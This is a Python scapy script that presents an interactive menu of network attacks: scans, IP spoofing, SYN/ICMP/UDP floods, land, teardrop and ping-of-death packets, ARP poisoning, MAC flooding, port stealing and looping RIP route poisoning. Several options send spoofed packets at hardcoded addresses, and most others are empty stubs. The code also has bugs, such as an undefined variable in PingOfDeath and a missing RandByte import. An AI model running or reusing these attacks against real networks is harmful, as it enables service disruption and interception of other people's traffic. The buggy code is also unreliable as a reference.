#! /usr/bin/env python
from scapy.all import send, sr, IP, ICMP, ARP, RandIP, RandMAC, TCP, UDP, RIP, RIPEntry
import fileinput
import sys

def neg():
    print("test")
    return "test"

# Lower Level Runners #
def IPSweep(ipDestination, payload): 
    packet = IP(dst=ipDestination) / ICMP() / payload
    return packet
def PortScan(ipDestination): 
    packet = IP(dst=ipDestination) / TCP(dport=(1,2000), flags="S")
    return packet
def IPSpoof(ipDestination, ipSource, payload):
    packet = IP(dst=ipDestination, src=ipSource) / ICMP() / payload
    return packet
def SFFlag(ipDestination, flags): 
    packet = IP(dst=ipDestination) / TCP(flags=flags)
    return packet
def FFlag(ipDestination, flags): 
    packet = IP(dst=ipDestination) / TCP(flags=flags)
    return packet
def URGFlag(ipDestination, flags, port):
    packet = IP(dst=ipDestination) / TCP(flags=flags, dport=port)
    return packet
def NoFlag(ipDestination, flags):
    packet = IP(dst=ipDestination) / TCP(flags=flags)
    return packet

# Denial of Service Attacks #
def SYNFlood(ipDestination, flags, port):
    packet = IP(dst=ipDestination) / TCP(dport=port, flags=flags)
    return packet
def ICMPFlood(ipDestination, payload, shouldSpoofAddress):
    packet = IP(dst=ipDestination) / ICMP() / payload
    return packet
def DropCommunication(ipDestination1, ipDestination2):
    packet1 = IP(dst=ipDestination1) / ICMP(type=3, code=1)
    packet2 = IP(dst=ipDestination2) / ICMP(type=3, code=1)
    return packet1, packet2
def ICMPRedirect(victim, attacker):
    packet = IP(dst=victim) / ICMP(type=5, code=1, gw=attacker)
    return packet
def UDPflood(ipDestination, payload):
    packet = IP(dst=ipDestination) / UDP(dport=20) / (payload * RandByte())
    return packet
def LandAttack(ipDestination, ipSource):
    packet = IP(dst=ipDestination, src=ipSource) / TCP(sport=139, dport=139, flags="S")
    return packet
def TeardropAttack(ipDestination1, ipDestination2, flags):
    packet1 = IP(dst=ipDestination1, flags=flags, id=12) / UDP() / ("X" * 100)
    packet2 = IP(dst=ipDestination2, id=12, frag=2) / UDP() / ("X" * 2)
    return packet1, packet2
def PingOfDeath(ipDestination1, payload):
    packet = IP(ipDestination2) / ICMP() / (payload * 65508)
    return packet

# Man in the Middle Attacks
def ARPPoisoning():
    routerIp = "192.168.1.1"
    routerMac = "00:00:00:00:00:01"
    victimIp = "192.168.1.17"
    victimMac = "00:00:00:00:00:02"
    attackerMac = "00:00:00:00:00:03"
    packet1 = ARP(op = 2, hwsrc=attackerMac, psrc=victimIp, hwdst=routerMac, pdst=routerIp)
    packet2 = ARP(op = 2, hwsrc=attackerMac, psrc=routerIp, hwdst=victimMac, pdst=victimIp)
    return packet1, packet2
def MACFlood():
    packet = ARP(op=2, psrc=RandIP(), hwsrc=RandMAC(), pdst=RandIP(), hwdst=RandMAC())
    return packet
def PortStealing():
    victimMac = "00:00:00:00:00:02"
    attackerMac = "00:00:00:00:00:03"
    packet = ARP(op=2, psrc=RandIP(), hwsrc=victimMac, pdst=RandIP(), hwdst=attackerMac)
    return packet
def RIPPoisoning():
    packet = IP(dst="224.0.0.9", ttl=1) / UDP(dport=520, sport=520) / RIP(cmd=2, version=2)/RIPEntry()
    return packet

# Higher Level Runners #
def RunIPSweep(): 
    packet=(IPSweep("192.168.1.1", "ABCDEFGH"))
    print("packet built: " + str(packet))
    print("hi1")
    print(0x42)
    print("hi2")
    print(str(0x42))
    send(packet, inter=0.005)
    return "test 5"
def RunPortScan(): 
    packet = PortScan("192.168.1.1", )
    sr(packet, inter=0.005)
    return "RunPortScan"
def RunIPSpoof():
    return 0
def RunSFFlag(): 
    return 0
def RunFFlag(): 
    return 0
def RunURGFlag():
    return 0
def RunNoFlag():
    return 0
def RunSYNFlood():
    return 0
def RunICMPFlood():
    return 0
def RunDropCommunication():
    return 0
def RunICMPRedirect():
    return 0
def RunUDPFlood():
    return 0
def RunLandAttack():
    return 0
def RunTeardropAttack():
    return 0
def RunPingOfDeath():
    return 0
def RunARPPoisoning():
    packets = ARPPoisoning()
    print("packet 0 =" + str(packets[0]))
    print("packet 1 =" + str(packets[1]))
    print("Sending both packets...")
    send(packets[0])
    send(packets[1])
    print("complete.")
    return "RunARPPoisoning"
def RunMACFlood():
    packet = MACFlood()
    print(packet)
    return "RunMACFlood"
def RunPortStealing():
    packet = PortStealing()
    send(packet)
    return "RunPortStealing"
def RunRIPPoisoning():
    packet = RIPPoisoning()
    print(packet)
    send(packet, inter=30, loop=1)
    return "RunRIPPoisoning"

def runnerHelper():
    functionTable = [
    "RunIPSweep():",
    "RunPortScan():",
    "RunIPSpoof()",
    "RunSFFlag():",
    "RunFFlag():",
    "RunURGFlag()",
    "RunNoFlag()",
    "RunSYNFlood()",
    "RunICMPFlood()",
    "RunDropCommunication()",
    "RunICMPRedirect()",
    "RunUDPFlood()",
    "RunLandAttack()",
    "RunTeardropAttack()",
    "RunPingOfDeath()",
    "RunARPPoisoning()",
    "RunMACFlood()",
    "RunPortStealing()",
    "RunRIPPoisoning()" ]
    for i in range (0, len(functionTable)):
        print("["+str(i)+"]-"+functionTable[i])

def runner(argument, args):
    switcher = {
      "-1": neg,
      "0": RunIPSweep,
      "1": RunPortScan,
      "2": RunIPSpoof,
      "3": RunSFFlag,
      "4": RunFFlag,
      "5": RunURGFlag,
      "6": RunNoFlag,
      "7": RunSYNFlood,
      "8": RunICMPFlood,
      "9": RunDropCommunication, "10": RunICMPRedirect,
      "11": RunUDPFlood,
      "12": RunLandAttack,
      "13": RunTeardropAttack,
      "14": RunPingOfDeath,
      "15": RunARPPoisoning,
      "16": RunMACFlood,
      "17": RunPortStealing,
      "18": RunRIPPoisoning,
    }
    func = switcher.get(argument, lambda: "nothing")
    print(func)
    return func()

runnerHelper()
while True:
    myInput = raw_input("Enter Attack\n")
    if (len(myInput)) > 0:
        runner(myInput, sys.argv);

